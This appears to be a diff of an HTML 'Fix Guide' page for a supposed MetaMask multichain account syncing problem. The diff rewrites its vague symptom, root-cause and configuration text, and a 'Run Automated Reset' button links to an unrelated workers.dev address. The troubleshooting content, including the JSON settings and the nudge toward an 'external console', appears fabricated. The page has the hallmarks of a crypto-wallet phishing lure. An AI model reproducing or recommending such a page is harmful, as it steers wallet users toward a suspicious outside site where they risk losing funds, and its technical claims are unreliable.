@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,34 @@
 <h1>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience an error when creating or syncing multichain accounts in Metamask, resulting in a fan-out issue that affects the performance and stability of the extension.</li>
+<li>Users experience excessive account creation and syncing issues with Metamask, resulting in a significant increase in span fan-out, leading to performance degradation and potential crashes.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an uncontrolled span of account creation and syncing across multiple chains, causing a resource overload and subsequent timeout.</li>
+<li>The error occurs due to an uncontrolled growth of multichain accounts, causing the Metamask extension to overload and struggle to manage the numerous account syncing requests, ultimately leading to a fan-out effect.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Set a limit on the number of chains that can be synced simultaneously using the <code>MAX_CHAINS</code> environment variable.</li>
-<li>Implement a rate limiter to control the frequency of account creation and syncing requests.</li>
-<li>Use the following JSON configuration to cap the span fan-out:</li>
+<li>To mitigate the issue, apply the following manual overrides:</li>
+<li>Limit the number of multichain accounts created within a specific timeframe</li>
+<li>Implement a rate limiter to restrict excessive syncing requests</li>
+<li>Utilize the following JSON configuration to cap account creation:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;multichain&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;maxChains&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;syncInterval&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;accountCreationLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;syncRequestLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;timeframe&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1h&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an alternative console to execute these commands for more flexibility.</p>
+<p>Consider utilizing an external console for more fine-grained control over the configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Basic understanding of Ethereum ecosystem and multichain account management</li>
-<li>Access to the Metamask extension's configuration files and environment variables</li>
+<li>Basic understanding of Ethereum ecosystem and multichain accounts</li>
+<li>Familiarity with JSON configuration files and rate limiting concepts</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
